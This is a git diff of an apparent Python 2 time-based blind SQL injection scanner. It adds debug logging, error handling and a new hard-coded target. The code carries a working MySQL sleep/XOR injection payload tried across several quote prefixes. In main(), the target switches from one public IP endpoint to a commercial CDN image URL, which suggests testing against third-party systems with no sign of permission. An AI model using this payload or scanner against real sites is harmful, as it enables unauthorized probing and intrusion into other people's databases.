@@ -43,6 +43,8 @@ class SQLInjectionTime(object):
             else:
                 self.orivalue = dict(urlparse.parse_qsl(self.data))
         # dict value keys
+        # if self.orivalue == {}:
+        #     return
         self.orivalue_keys = self.orivalue.keys()
         # map the param key to 1,2,3
         self.variations = dict(zip(xrange(len(self.orivalue_keys)), self.orivalue_keys))
@@ -663,6 +665,7 @@ class SQLInjectionTime(object):
         timeOrigValueDict[self.variations[varIndex]] += paramValue
         origParamValue = urllib.unquote(urllib.urlencode(timeOrigValueDict))
 
+        logger.info(Fore.RED + "origParamValue= {}".format(origParamValue) + Style.RESET_ALL)
         confirmed = False
         # 生成四个时间变量
         time1 = 0 # long  4
@@ -687,6 +690,7 @@ class SQLInjectionTime(object):
             # 这里paramValue应该是a=b&c=d这种形式的，
             paramValue_dict = Url.qs_parse(paramValue)
 
+            print ""
             self.hj.request_param_dict = paramValue_dict
             status_code, headers, html, time_used = self.hj.request()
             logger.info("time_usd={} & sleep={}".format(time_used, self.genSleepString('long')))
@@ -809,6 +813,7 @@ class SQLInjectionTime(object):
         prefix = ['', '\'', '"', '\')', '")']
         for quoteChar in prefix:
             payload = quoteChar + " or if(now()=sysdate(),sleep({SLEEP}),0)/*'XOR(if(now()=sysdate(),sleep({SLEEP}),0))OR'\"XOR(if(now()=sysdate(),sleep({SLEEP}),0))OR\"*/" + " or " + quoteChar
+            logger.info(Fore.RED + "pyaload={}".format(payload) + Style.RESET_ALL)
             time_result = self.testTiming(varIndex, payload, True, benchmark=False)
             if time_result:
                 logger.info(Fore.RED + "Found Time Injection At URL={}".format(self.url) + Style.RESET_ALL)
@@ -855,22 +860,25 @@ class SQLInjectionTime(object):
         return False
 
     def startTest(self):
-        for varIndex in self.variations:
-            if self.checkIfResponseIsStable(varIndex):
-                logger.info("[startTest] Response Is Stable")
-            else:
-                logger.info("[startTest] Response Is Not Stable")
+        try:
+            for varIndex in self.variations:
+                if self.checkIfResponseIsStable(varIndex):
+                    logger.info("[startTest] Response Is Stable")
+                else:
+                    logger.info("[startTest] Response Is Not Stable")
 
-            r = self.testTimingStartPoint(varIndex)
-            if r:
-                # here shoud be return a format result
-                return True
+                r = self.testTimingStartPoint(varIndex)
+                if r:
+                    # here shoud be return a format result
+                    return True
 
-            r = self.testTimingStartPoint(varIndex)
-            if r:
-                return True
+                r = self.testTimingStartPoint(varIndex)
+                if r:
+                    return True
 
-        return False
+            return False
+        except Exception as e:
+            logger.error("error happend, reason is :{}, URL: {}".format(repr(e), self.url))
             # r = self.testInjectionWithOR(varIndex)
 
 def main():
@@ -879,9 +887,11 @@ def main():
         'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36',
         'Referer': 'http://10.127.21.237/dvwa/vulnerabilities/sqli_blind/'
     }
-    url = 'http://36.110.238.86/platform/query/dev_center/devCheck.php?devid=355470062554361&method=getCheckInfo'
+    url = 'http://img12.360buyimg.com/n2/jfs/t3229/314/6863934982/144141/86bc1245/58aeb140Nde581af9.jpg!q90'
     a = SQLInjectionTime(url, headers)
-    a.startTest()
+    r = a.startTest()
+    if r:
+        print "o fuck"
     # for i in a.variations:
     #     print i
     #     if a.checkIfResponseIsStable(i):
